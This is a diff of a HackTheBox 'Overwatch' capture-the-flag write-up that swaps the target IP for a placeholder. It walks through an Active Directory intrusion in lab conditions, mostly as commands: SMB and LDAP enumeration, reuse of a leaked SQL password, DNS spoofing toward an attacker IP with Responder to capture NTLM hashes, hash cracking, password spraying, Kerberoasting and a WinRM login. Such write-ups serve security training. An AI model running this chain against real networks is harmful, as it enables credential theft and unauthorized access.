@@ -1,6 +1,6 @@
 # Overwatch - HackTheBox Writeup
 
-**Target:** `10.129.28.165`
+**Target:** `TARGET_IP`
 **Domain:** `overwatch.htb`
 **OS:** Windows Server 2022 (Active Directory)
 **Difficulty:** Medium/Hard
@@ -45,12 +45,12 @@ Root Flag
 
 ### Host Setup
 ```bash
-echo "10.129.28.165 overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts
+echo "TARGET_IP overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
-nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n 10.129.28.165
+nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
 ```
 
 **Key Findings:**
@@ -73,12 +73,12 @@ nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,4966
 
 ```bash
 netexec smb overwatch.htb -u '' -p '' --shares
-netexec smb 10.129.28.165 -u 'guest' -p '' --shares
+netexec smb TARGET_IP -u 'guest' -p '' --shares
 ```
 **Result:** `STATUS_ACCESS_DENIED` — Null sessions and guest access blocked.
 
 ```bash
-smbclient //10.129.28.165/software$ -N
+smbclient //TARGET_IP/software$ -N
 ```
 **Result:** ✅ Anonymous access to `software$` share granted.
 
@@ -99,7 +99,7 @@ Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
 ### MSSQL Access Verification
 
 ```bash
-netexec mssql 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
+netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
 ```
 ```
 [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
@@ -113,7 +113,7 @@ netexec mssql 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
 ### Privilege Check
 
 ```bash
-netexec mssql 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
+netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
   -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
 ```
 **Result:** ❌ NOT a sysadmin.
@@ -121,7 +121,7 @@ netexec mssql 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
 ### Interactive Session
 
 ```bash
-impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.28.165 -port 6520 -windows-auth
+impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
 ```
 
 ```sql
@@ -144,18 +144,18 @@ enum_owner
 
 **SYSVOL Access:**
 ```bash
-smbclient //10.129.28.165/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
+smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
   -c "recurse ON; prompt OFF; cd overwatch.htb; mget *" 2>/dev/null
 ```
 
 **LDAP User Enumeration:**
 ```bash
-netexec ldap 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 2>/dev/null
+netexec ldap TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 2>/dev/null
 ```
 
 **AS-REP Roasting:**
 ```bash
-impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip 10.129.28.165 -no-pass -format hashcat
+impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
 ```
 **Result:** No AS-REP roastable accounts found.
 
@@ -308,7 +308,7 @@ Crack hash → new credentials
 ```bash
 # Create fake A record for SQL07 pointing to attacker machine
 dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
-  --action add --record SQL07 --data <ATTACKER_IP> 10.129.28.165
+  --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP
 
 # Start Responder to capture NTLM authentication
 sudo responder -I tun0
@@ -338,27 +338,27 @@ hashcat -m 5600 <captured_hash> /usr/share/wordlists/rockyou.txt --force
 
 ### Password Policy Check
 ```bash
-netexec smb 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol
+netexec smb TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol
 ```
 
 ### SMB Spraying (Fast)
 ```bash
-netexec smb 10.129.28.165 -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
+netexec smb TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
 ```
 
 ### LDAP Spraying (Stealth)
 ```bash
-netexec ldap 10.129.28.165 -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
+netexec ldap TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
 ```
 
 ### Kerbrute Spraying
 ```bash
-kerbrute passwordspray -d overwatch.htb --dc 10.129.28.165 users.txt 'TI0LKcfHzZw1Vv'
+kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv'
 ```
 
 ### Kerberoasting
 ```bash
-impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip 10.129.28.165 -request
+impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
 ```
 
 ---
@@ -369,7 +369,7 @@ The cracked hash revealed credentials for `sqlmgmt`, a member of the **Remote Ma
 
 ### Connect via WinRM
 ```bash
-evil-winrm -i 10.129.28.165 -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
+evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
 ```
 
 ### Capture User Flag
